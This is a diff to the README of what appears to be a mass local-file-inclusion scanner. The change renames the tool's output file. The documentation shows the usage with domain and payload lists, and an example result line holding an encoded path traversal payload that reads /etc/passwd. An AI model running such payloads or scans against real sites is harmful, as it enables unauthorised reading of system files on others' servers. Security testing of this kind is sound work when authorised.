@@ -67,7 +67,7 @@ python3 scanner.py [-h] -d DOMAINS -p PAYLOADS [-b BATCH_SIZE] [-bd BATCH_DELAY]
 ```python3 scanner.py -d domains.txt -p payloads.txt -b 100 -bd 2 -t 2 -r 3```
 
 ### Output
-The results will be saved in lfi-export.txt in the following format:
+The results will be saved in ```write-poc.txt``` in the following format:
 ```
 Success: http://example.com - Payload: %2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
 ```
